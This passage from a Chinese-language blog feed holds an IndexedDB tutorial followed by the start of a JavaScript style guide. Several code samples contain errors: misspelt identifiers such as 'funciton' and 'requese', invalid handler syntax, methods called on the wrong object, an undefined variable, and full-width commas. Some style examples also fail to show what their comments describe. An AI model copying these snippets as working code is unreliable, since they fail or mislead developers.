title="基本使用模式"></a>基本使用模式</h4><ol><li>打开数据库并且开始一个事务。</li><li>创建一个 object store。</li><li>构建一个请求来执行一些数据库操作，像增加或提取数据等。</li><li>通过监听正确类型的 DOM 事件以等待操作完成。</li><li>在操作结果上进行一些操作（可以在 request 对象中找到）</li></ol><blockquote><p>记住一点，任何对indexedDB数据库的操作都是异步进行的，任何操作都会有两个必定的事件权柄：<code>success</code>和<code>error</code>，以下的操作均要事情设置相应的监视事件防止出现错误，由于个人比较懒，在这里展示就不加上了</p></blockquote><h4 id="打开数据库"><a href="#打开数据库" class="headerlink" title="打开数据库"></a>打开数据库</h4><p>和mysql/sql数据库的使用一样，indexedDB的使用依旧是从打开数据库开始的，打开方式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = indexedDB.open(DBname, version);</span><br><span class="line"><span class="comment">// DBname：数据库名； version：要打开的数据库版本号（可不传值，默认为最新版本）</span></span><br></pre></td></tr></table></figure><blockquote><p>版本号只能使用int类型，而不能使用浮点数，不然会导致错误</p></blockquote><p>与其它操作不同，open操作特有两个权柄：<code>upgradeneeded</code>（版本更新）和<code>blocked</code>（没有关闭连接尝试连接，（不常用））;</p><p>依据基本使用模式，正确的打开姿势应为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = indexedDB.open(DBname, version);</span><br><span class="line"></span><br><span class="line">request.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">request.onsuccess = funciton() &#123;&#125;;</span><br><span class="line">request.onupgradeneeded = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">request.onblocked = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开的数据库为request触发的成功事件中的event.target.result;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 以后的操作参照这种方式创建监视事件</span></span><br></pre></td></tr></table></figure><blockquote><p>注：这里有一个坑，upgradeneeded（版本改动），故名思意是版本改动才会触发的事件，在MDN上的解释是“在数据库第一次被打开时或者当指定的版本号高于当前被持久化的数据库的版本号时，这个版本改动事务将被创建。”，而<code>任何对数据库结构产生改变的操作都应该在这个事件内执行</code>，至于怎么改变数据库结构，请看下文。</p></blockquote><h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">indexedDB.deleteDatabase(DBname);</span><br></pre></td></tr></table></figure><h4 id="对象存储空间"><a href="#对象存储空间" class="headerlink" title="对象存储空间"></a>对象存储空间</h4><p>关于对象存储空间，咱们可以把它看成是数据库的一个表，存储空间（表）的使用如下：</p><h5 id="打开存储空间"><a href="#打开存储空间" class="headerlink" title="打开存储空间"></a>打开存储空间</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = db.objectStore(storeName);</span><br></pre></td></tr></table></figure><h5 id="创建存储空间"><a href="#创建存储空间" class="headerlink" title="创建存储空间"></a>创建存储空间</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = db.createObjectStore(storeName, &#123;<span class="attr">keyPath</span>: keyName， autoIncrement: <span class="literal">true</span>&#125;);</span><br><span class="line"><span class="comment">// 创建存储空间</span></span><br></pre></td></tr></table></figure><p>创建存储空间必须设置keyPath（可以把它看成是存储空间的主键），createObjectStore方法的第二个参数对象就是对keyPath键的配置，配置对象中除了指定键为keyPath，还有另外一个属性<code>autoIncrement</code>,这个属性在MDN文档上的解释是</p><p><img src="http://blog.static.minfive.com/post/17-08-07/createObjectStore.png" alt="createStore"></p><p>通俗化讲就是<code>autoIncrement</code>属性是用来设置在被指定为keyPath的键为空时，是否自动生成keyPath值（这里有一点：不启用自动填补keyPath值时，因为keyPath是必须的，如果传入的数据中被指定为keyPath的键为空时，会导致创建存储空间失败，触发error事件）</p><h5 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h5><p>什么是索引：</p><p>当用户想要通过其它键去访问查询存储空间中的数据时，索引就派上用场了，索引可以看成是存储空间的一个副本，只不过把主键替换成你想要的键，但它并不真实存在，只是给存储空间的访问查询提供了便利。</p><p>创建方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = db.createObjectStore(storeName, &#123;<span class="attr">keyPath</span>: keyName， autoIncrement: <span class="literal">true</span>&#125;；</span><br><span class="line">store.createIndex(indexName, keyName, &#123; <span class="attr">unique</span>: <span class="literal">false</span>&#125;);</span><br><span class="line"><span class="comment">// createIndex有三个参数，第一个为索引名，第二个为设置索引的键，第三个为配置对象，unique表示是否允许重复，是否允许重复要根据存储空间的数据而定</span></span><br></pre></td></tr></table></figure><h5 id="填充数据"><a href="#填充数据" class="headerlink" title="填充数据"></a>填充数据</h5><p>向存储空间中填充数据有两个方法：add方法和put方法，两个方法都是向存储空间中填充数据，但add相当于插入新值，当存储空间中已有相同数据（即keyPath值相同）时会返回错误，put相当于更新原有的值，与add方法相反，put方法会更新已有的数据。</p><p>使用方式为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">store.add(obj);</span><br><span class="line">store.put(obj);</span><br><span class="line"><span class="comment">// obj为格式正确的数据对象</span></span><br></pre></td></tr></table></figure><h5 id="修改存储空间结构"><a href="#修改存储空间结构" class="headerlink" title="修改存储空间结构"></a>修改存储空间结构</h5><p>对于创建索引和设置keyPath的操作均视为改变数据库结构的操作，因此这些操作必须在upgradeneeded事件下进行，那么问题来了，如果你想重新配置数据库，那么应该怎么去触发这个事件呢？</p><p>解决方法有很多种，在这里介绍两种比较实用的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种，关闭现有数据库连接，打开新版本号的数据库</span></span><br><span class="line"><span class="keyword">var</span> request = indexedDB.open(dbName, version),</span><br><span class="line">    db;</span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    db = event.target.result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里设置延时，因为数据库操作是异步进行的</span></span><br><span class="line">setTimeOut(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    db.close();</span><br><span class="line">    </span><br><span class="line">    request = indexedDB.open(dbName, version + <span class="number">1</span>);</span><br><span class="line">    request.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        db = event.target.result;</span><br><span class="line">    &#125;</span><br><span class="line">    requese.onupgradeneeded(event) &#123;</span><br><span class="line">        <span class="comment">// 这里是更改数据库结构的代码</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">&#125;, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种，与第一种原理相同，只不过换了另外一种方式</span></span><br><span class="line"><span class="keyword">var</span> request = indexedDB.open(dbName, version),</span><br><span class="line">    db;</span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    db = event.target.result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setTimeOut(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> deleteDbRequest = db.deleteDatabase(dbName);</span><br><span class="line">    deleteDbRequest.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> openRequest = localDatabase.indexedDB.open(dbName,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        openRequest.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">            db = openRequest.result;</span><br><span class="line">        &#125;;  </span><br><span class="line">        openRequest.onupgradeneeded = <span class="function"><span class="keyword">function</span> (<span class="params">evt</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 这里是更改数据库结构的代码</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>在红宝书中的解释是“跨过创建对象存储空间这一步之后，接下来的所有操作都是要通过事务来完成，任何时候，只要想读取或修改数据，都要通过事务来组织所有操作”，简单点说就是事务就是一个工具，通过这个工具，你才能任意的去数据库中获取你想要的东西。</p><blockquote><p>这里需要注意一下，事务接收的DOM事件与其它操作有点不同，它接收三个事件：error（失败），abort（中止），complete（完成），至于传递额事件对象及其使用方法请参考<a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" target="_blank" rel="noopener">MDN文档</a></p></blockquote><p>事务的所有方法及属性如下：</p><p><img src="http://blog.static.minfive.com/post/17-08-07/transaction.png" alt="transaction"></p><h4 id="创建方法"><a href="#创建方法" class="headerlink" title="创建方法"></a>创建方法</h4><p>在数据库中调用transaction（）方法进行创建事务，该方法可指定两个参数，第一个参数是事务可操作的存储空间，该参数可为数组，传递多个存储空间，第二个参数是事务的访问模式（也就是访问权限），模式有三种：读写（readwrite）、只读（readonly）、版本改变（versionchange），不设置访问模式的话默认是readonly。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不带任何参数，表示创建一个能访问数据库中所有存储空间的事务，但这个事务只有读取的权限</span></span><br><span class="line"><span class="keyword">var</span> transaction = db.transaction();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定一个存储空间</span></span><br><span class="line"><span class="keyword">var</span> transaction = db.transaction(storeName);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定多个存储空间</span></span><br><span class="line"><span class="keyword">var</span> transaction = db.transaction([storeName1, storeName2]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定一个存储空间并设置读写权限</span></span><br><span class="line"><span class="keyword">var</span> transaction = db.transaction(storeName, <span class="string">"readwrite"</span>);</span><br></pre></td></tr></table></figure><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>在创建了事务后，可以使用objectStore（）方法传入存储空间的名称，获取存储空间对象，这个基于事务创建的存储空间对象会比createObjectStroe（）方法创建的存储空间对象多一些可使用的方法：get[取值]、delete[删除指定数据对象]、clear[清空存储空间中所有数据]等常用方法外，还有其它方法，所有方法请见下图：</p><p><img src="http://blog.static.minfive.com/post/17-08-07/store.png" alt="store"></p><blockquote><p>这部分只展示一些常用的方法，其余方法请自行参考<a href="https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API" target="_blank" rel="noopener">文档</a></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = db.transaction(tableName, <span class="string">"readwrite"</span>).objectStore(<span class="string">"tableName"</span>),</span><br><span class="line">    request;</span><br><span class="line"><span class="comment">// 获取指定keyPath值的数据</span></span><br><span class="line">request = store.get(keyPathValue);</span><br><span class="line"></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"数据为"</span> + <span class="built_in">JSON</span>.stringify(event.target.result));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除指定数据</span></span><br><span class="line">request = store.delete(keyPathValue);</span><br><span class="line"></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"删除成功"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空存储空间</span></span><br><span class="line">request = store.clear();</span><br><span class="line"></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"清空了存储空间"</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="游标"><a href="#游标" class="headerlink" title="游标"></a>游标</h3><p>上边说的所有操作，基本上和普通的数据库没有太大差别，而游标却是indexedDB最具特色的一个东西，与键范围结合使用将大大加快数据检索速度，同时操作也将更为方便。<br>游标的话可以看成是一个指针，指向存储空间的某个位置，每个位置上均有一个数据对象，然后可以对数据对象进行操作，游标可以按你意愿进行移动，访问你想访问的数据。<br>键范围的话则是在存储空间中再划分出来一个范围进行检索，缩小了检索的范围。</p><h4 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h4><p>使用openCursor（）方法进行创建，该方法接收两个参数，第一个参数为键范围实例，第二个参数为游标的移动方向。两个参数均有默认值。</p><p>移动方向有4个设置常量：</p><blockquote><ol><li>IDBCursor.NEXT(0)：下一项，为默认值。</li><li>IDBCursor.NEXT_NO_DUPLICATE(1)：下一个不重复的项。</li><li>IDBCursor.PREV(2)：前一项。</li><li>IDBCursor.PREV_NO_DUPLICATE：前一个不重复的项。</li></ol></blockquote><h4 id="游标自身（IDBCursor实例）"><a href="#游标自身（IDBCursor实例）" class="headerlink" title="游标自身（IDBCursor实例）"></a>游标自身（IDBCursor实例）</h4><p>IDBCursor实例有4个属性，分别是：</p><ol><li>direction：数值，表示游标移动的方向。</li><li>key：对象的键。</li><li>value：实际的数据对象。</li><li>primaryKey：游标使用的键（即当前存储空间或索引中设置的主键）。</li></ol><blockquote><p>以上4个属性均为只读</p></blockquote><p>另外，IDBCursor实例还有几个常用方法：</p><ol><li>update（dataObj）：更新当前游标所对应的数据对象值，dataObj为传递的新数据。</li><li>delete（）：删除当前游标所对应的数据。</li><li>continue（key）：移动游标到结果集中的下一项。参数key是可选的，不指定这个参数，游标移动到下一项；指定这个参数，游标会移动到指定键的位置。</li><li>advance（count）：向前移动count指定个项数。</li></ol><blockquote><p>这里有一点要注意，每一次移动游标成功后，触发的success事件的event.target.result为IDBCursor实例自己，但当移动方向在结果集中再无下一项，仍然移动光标的话，event.target.result的值将为undefined。</p></blockquote><p>使用方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = db.transaction(tableName).objectStore(storeName),</span><br><span class="line">    request,</span><br><span class="line">    cursor;</span><br><span class="line"></span><br><span class="line">request = store.openCursor(); <span class="comment">// 在这里可以传入配置好的键范围</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取属性值及使用方法</span></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    cursor = event.target.result;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (cursor) &#123;</span><br><span class="line">        <span class="comment">// 必须进行判断</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"数据对象为"</span> + <span class="built_in">JSON</span>.stringify(cursor.value));</span><br><span class="line">        cursor.continue(); <span class="comment">// 游标移动到下一项</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="键范围"><a href="#键范围" class="headerlink" title="键范围"></a>键范围</h4><p>使用IDBKeyRange对象创建相应的键范围<br>IDBKeyRange对象有4中不同的创建方法：only（）、lowerBound（）、upperBound（）以及bound（）；</p><ol><li>only：只取得主键值为指定值得数据。传递一个参数keyPathValue（主键值）；</li><li>lowerBound：从主键值为指定主键值的对象开始。传递两个参数：第一个keyPathValue（主键值），第二个为布尔值，表示是否包含满足条件的开始对象，true表示不包含，false表示包含，默认为false。</li><li>upperBound：到主键值为指定主键值的对象为止。传递参数与lowerBound方法相同，第二个参数为true代表不包含起止对象。</li><li>bound：最直接的方法，允许设置起始对象，结束对象，以及是否包含起止对象。</li></ol><blockquote><p>由于个人比较懒，在这里就不给大家撸代码了，直接贴上MDN文档中的代码，希望大家勿怪哈A_A</p></blockquote><p><img src="http://blog.static.minfive.com/post/17-08-07/IDBKeyRange.png" alt="IDBKeyRange"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>以上为个人总结的一些关于indexedDB操作的一些常用方式以及填的一些坑，希望对大家学习有帮助，如果有什么疑问错误的话，请指出，大家共同学习。另外，关于indexedDB更详细的操作方法请查询MDN文档或W3C官网，这里只是讲解一些常见的操作。<br>唉，写这篇博客真心累啊，期间从广州跑回学校，又从学校跑回广州，来来回回，千山万水！ - -宝宝心里苦啊···唉，还是希望这篇文章对大家有帮助吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;趁着最近清闲，把先前落下的红宝书下半部分给看完了，最感冒的是客户端存储，WebSocket以及canvas（WebGL），WebSocket
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="javascript" scheme="http://blog.minfive.com/tags/javascript/"/>
    
      <category term="学习" scheme="http://blog.minfive.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript代码格式规范</title>
    <link href="http://blog.minfive.com/2016/04/03/JavaScript%E4%BB%A3%E7%A0%81%E6%A0%BC%E5%BC%8F%E8%A7%84%E8%8C%83/"/>
    <id>http://blog.minfive.com/2016/04/03/JavaScript代码格式规范/</id>
    <published>2016-04-02T16:00:00.000Z</published>
    <updated>2019-03-31T13:29:00.153Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>实习3个月，从代码渣渣到现在的代码还是渣渣，参与了公司实际项目开发，却深受代码不规范的危害。结构混乱，代码藕隅严重，书写格式千奇百怪，开发起来着实心累，同时也会大大的拉低开发的效率，因此，更加注重了代码规范性，并将《编写可维护的JacaScript》一书中的代码规范贴上来让跟更多的人了解—如果您未了解，可以继续阅读下去，如果您已阅读过的话，请到此为止，避免做太多无用功。</p><blockquote><p>本风格指南基于“Java语言编程规范”和Crockford的（javascript）编程规范，同时结合作者的经验和喜好做了一些改动—转至《编写可维护的JavaScript》</p></blockquote><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><p>每一行的层级由4个空格组成，避免使用制表符（Tab）进行缩进。（这个规范因人而异吧，有些人喜欢用Tab有些人喜欢用空格，但是团队协作的话就必须统一一种方式）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="行的长度"><a href="#行的长度" class="headerlink" title="行的长度"></a>行的长度</h3><p>每行长度不应该超过80个字符。如果一行多于80个字符，应该在一个运算符（都好，加号等）后换行。下一行应当增加两级缩进（8个字符） 由于使用markdown语法编写，缩进效果出不来，各位看官请勿见怪</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ 好的写法</span><br><span class="line">doSomething(arguments1, argument2, argument3, argument4, argument5);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法:第二行只有4个空格的缩进</span></span><br><span class="line">doSomething(argument1, argument2, argument3, argument4, argument5);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：在运算符之前换行</span></span><br><span class="line">doSomething(argument1, argument2, argument3, argument4, argument5);</span><br></pre></td></tr></table></figure><h3 id="原始值"><a href="#原始值" class="headerlink" title="原始值"></a>原始值</h3><p>字符串应该使用使用双引号（避免使用单引号）且保持一行。避免在字符串中使用斜线另起一行（一种通过JavaScript编译方式进行取巧的方法）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"Mr.Five"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：单引号</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">'Mr.Five'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：字符串结束之前换行</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"Here's the story, of a man \ named Brady."</span>;</span><br></pre></td></tr></table></figure><p>数字应当使用十进制整数，十六进制整数，或者十进制浮点小数，小数点前后应该至少保存以为数字。避免使用八进制直接量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10.0</span>;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10.00</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0xA2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">1e23</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：十进制以小数点结尾</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">10.</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：十进制数字以小数点开头</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">.1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：八进制（base 8）写法已废弃</span></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">010</span>;</span><br></pre></td></tr></table></figure><p>特殊值null除了下属情况下应当避免使用。</p><ul><li>用来初始化一个变量，这个变量可能被赋值为一个对象。</li><li>用来和一个已经初始化的变量比较，这个变量可以是也可以不是一个对象。</li><li>当函数的参数期望是对象时，被用作参数传入。</li><li>当函数的返回值期望是对象时，被用作返回值传出。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> person = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPerson</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (condition) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Person(<span class="string">"Mr.Five"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">var</span> person = getPerson();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (person !== <span class="literal">null</span>) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：和一个未被初始化的变量比较</span></span><br><span class="line"><span class="keyword">var</span> person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (person !==<span class="literal">null</span>) &#123;</span><br><span class="line">    doSomething();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：通过测试判断某个参数是否被传递</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params">arg1, arg2, arg3, arg4</span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (arg4 != <span class="literal">null</span>) &#123;</span><br><span class="line">        doSomethingElse();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>避免使用特殊值undefined。判断一个变量是否定义应当使用typeof操作符。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> variable == <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    <span class="comment">//do sonething</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的写法：使用了undefined直接量</span></span><br><span class="line"><span class="keyword">if</span> (variable == <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="comment">//do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运算符间距"><a href="#运算符间距" class="headerlink" title="运算符间距"></a>运算符间距</h3><p>二元运算符前后必须使用一个空格来保持表达式的整洁。操作符包括赋值运算符和逻辑运算符。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 